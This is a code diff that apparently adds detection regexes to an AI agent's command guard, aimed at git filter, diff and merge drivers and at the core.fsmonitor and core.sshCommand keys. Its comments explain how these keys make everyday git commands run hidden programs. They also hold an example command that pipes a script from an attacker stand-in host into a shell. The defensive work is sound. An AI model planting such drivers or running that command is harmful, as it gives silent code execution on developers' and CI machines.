@@ -1975,3 +1975,117 @@ GIT_CONFIG_BANG_VALUE_INI_RE = re.compile(
 # under (the same precision tradeoff GIT_CONFIG_HELPER_CONTENT_RE's own
 # bare `helper =` check already makes once the path is confirmed).
 GIT_CONFIG_BANG_VALUE_CONTENT_RE = re.compile(r"=\s*['\"]?!", re.IGNORECASE)
+
+# ---- .gitattributes filter/diff/merge driver hijack + non-bang direct-exec
+# git-config keys ------------------------------------------------------------
+# Two more git-driven code-execution primitives neither `rule_git_config_exec_
+# protect` nor `rule_git_hooks_protect` reaches:
+#
+#   - `.gitattributes` (repo root or any nested directory) or `.git/info/
+#     attributes` mapping a path pattern to a `filter=<name>`, `diff=<name>`,
+#     or `merge=<name>` attribute. On its own this plants no executable code
+#     — but paired with a `filter.<name>.clean`/`smudge`/`process`,
+#     `diff.<name>.textconv`/`command`, or `merge.<name>.driver` git-config
+#     value (set now, in a SEPARATE call, or already present from an earlier
+#     legitimate tool install — git-lfs being the ubiquitous example), it
+#     turns the single most ordinary git actions there are — `git add`,
+#     `git checkout`, `git diff`, `git status` (for a `process`/`required`
+#     filter), `git log -p`, `git show`, a merge/rebase — into unattended,
+#     silent command execution for every path the attribute matches. Unlike
+#     a git alias (`rule_git_config_exec_protect`'s bang-value check), which
+#     needs the human to type the exact alias NAME, this fires on whatever
+#     the human/CI was already going to run — no unusual verb, nothing that
+#     reads as different from an ordinary day of git use. `.gitattributes`
+#     is also the half of the pair that's typically TRACKED and pushed with
+#     the repo, so it rides along in an ordinary PR diff read as routine
+#     repo configuration (line-ending normalization, LFS tracking), not as
+#     a wired detonator.
+#   - `core.fsmonitor` and `core.sshCommand`: two git-config keys that run an
+#     arbitrary program directly, with NO `!`-prefix marker required —
+#     `GIT_CONFIG_BANG_VALUE_RE`/`_INI_RE`/`_CONTENT_RE` only fire when the
+#     VALUE starts with `!`, so `git config core.fsmonitor 'curl
+#     attacker.example/x|sh'` (a bare command, no bang) sails through that
+#     guard with zero detection despite `core.fsmonitor` running on nearly
+#     every git command (status/add/commit/checkout/diff) once set, and
+#     `core.sshCommand` running on every fetch/push/pull over SSH. The
+#     filter/diff/merge driver keys above share the exact same "direct
+#     command, no bang required" syntax — `filter.<name>.clean = my-script`
+#     is a complete, valid, already-dangerous config line with no `!`
+#     anywhere in it.
+#
+# Gated on the KEY ALONE (any value) for the direct-exec config keys, the
+# same reason `rule_git_config_exec_protect` gates `credential.helper` on
+# the key alone: there is no safe/dangerous split by VALUE for a key whose
+# only purpose is naming a program to run — unlike a bare git alias
+# (`co = checkout`), which is common and totally benign. This does cost a
+# false "ask" on the fully-inert `core.fsmonitor = true`/`false` builtin
+# toggle (no subprocess at all for those two values) — the same "false
+# positives are the safe direction" trade-off this file already takes
+# throughout, and `ask` (not `deny`) keeps that cost to one human glance.
+GIT_ATTRS_PATH_RE = re.compile(
+    r"(?:^|[\s'\"/\\=])\.gitattributes" + _CI_END
+    + r"|(?:^|[\s'\"/\\=])\.git" + _WIN_TRIM + _SEP + r"info" + _WIN_TRIM + _SEP
+    + r"attributes" + _CI_END
+    # git's documented global fallback ($XDG_CONFIG_HOME/git/attributes,
+    # defaulting to ~/.config/git/attributes) — same reasoning
+    # GIT_CONFIG_FILE_PATH_RE's own XDG alternative documents for
+    # ~/.config/git/config.
+    + r"|(?:^|[\s'\"/\\=])\.config" + _WIN_TRIM + _SEP + r"git" + _WIN_TRIM + _SEP
+    + r"attributes" + _CI_END,
+    re.IGNORECASE,
+)
+# Content check: a `filter=`/`diff=`/`merge=` attribute ASSIGNMENT (a value
+# after the `=`) — gitattributes' "unset" convention for these string-valued
+# attributes is a bare `-filter`/`-diff`/`-merge` with no `=` at all, so
+# requiring a non-empty value after `=` already excludes it without a
+# separate negative check.
+GIT_ATTRS_DRIVER_ASSIGN_RE = re.compile(
+    r"(?<![\w-])(?:filter|diff|merge)=[^\s'\"]{1,200}",
+    re.IGNORECASE,
+)
+_GIT_ATTRS_EXEC_KEY = (
+    r"\bfilter\.[^\s'\"=]{1,300}\.(?:clean|smudge|process)\b(?!\.[\w-])"
+    r"|\bdiff\.[^\s'\"=]{1,300}\.(?:textconv|command)\b(?!\.[\w-])"
+    r"|\bmerge\.[^\s'\"=]{1,300}\.driver\b(?!\.[\w-])"
+    r"|\bcore\.fsmonitor\b(?!\.[\w-])"
+    r"|\bcore\.sshcommand\b(?!\.[\w-])"
+)
+GIT_ATTRS_EXEC_KEY_RE = re.compile(
+    r"\bgit\b[^|;&\n]{0,200}\bconfig\b" + _GIT_CONFIG_NOT_GET_LOOKAHEAD
+    + r"[^|;&\n]{0,200}(?:" + _GIT_ATTRS_EXEC_KEY + r")"
+    r"|(?<!\S)(?:-c|--config(?:-env)?)[\s=]+(?:" + _GIT_ATTRS_EXEC_KEY + r")"
+    r"|\bGIT_CONFIG_KEY_\d+\s*=\s*['\"]?(?:" + _GIT_ATTRS_EXEC_KEY + r")",
+    re.IGNORECASE,
+)
+# Path-independent staged-elsewhere-then-redirected form — mirrors
+# GIT_CONFIG_CREDENTIAL_HELPER_INI_RE/GIT_CONFIG_BANG_VALUE_INI_RE's shape:
+# a KNOWN section header (filter/diff/merge are all named subsections;
+# core is not) followed, within the same section body, by the exec-capable
+# leaf key.
+GIT_ATTRS_EXEC_INI_RE = re.compile(
+    r"\[filter\s+\"[^\"\n]{0,200}\"\][^\[]{0,2000}\b(?:clean|smudge|process)\s*="
+    r"|\[diff\s+\"[^\"\n]{0,200}\"\][^\[]{0,2000}\b(?:textconv|command)\s*="
+    r"|\[merge\s+\"[^\"\n]{0,200}\"\][^\[]{0,2000}\bdriver\s*="
+    r"|\[core\][^\[]{0,2000}\b(?:fsmonitor|sshCommand)\s*=",
+    re.IGNORECASE,
+)
+# Content-only check for a CONFIRMED git-config path (gated by
+# GIT_CONFIG_FILE_PATH_RE, not used standalone) — same "an Edit's new_string
+# is typically just the inserted line, the section header itself is
+# old_string context" reasoning GIT_CONFIG_HELPER_CONTENT_RE's own comment
+# documents. `command` is deliberately excluded here (unlike the INI form
+# above) — too generic a bare word to trust once the section-header context
+# is gone; still caught via GIT_ATTRS_EXEC_INI_RE when the header is present
+# in the same fragment, or via GIT_ATTRS_EXEC_KEY_RE for the CLI form.
+GIT_ATTRS_EXEC_CONTENT_RE = re.compile(
+    r"\b(?:clean|smudge|process|textconv|driver|fsmonitor|sshCommand)\s*=",
+    re.IGNORECASE,
+)
+# `find -path/-name/-wholename/-regex` indirection, same reason every other
+# `*_find_hit` in this file exists for its own surface.
+GIT_ATTRS_FIND_RE = _find_predicate_re(
+    r"(?:\.gitattributes\b|\.git[/\\]info[/\\]attributes\b)")
+
+
+def git_attrs_find_hit(cmd: str) -> bool:
+    return _find_word_and_predicate_hit(cmd, GIT_ATTRS_FIND_RE)
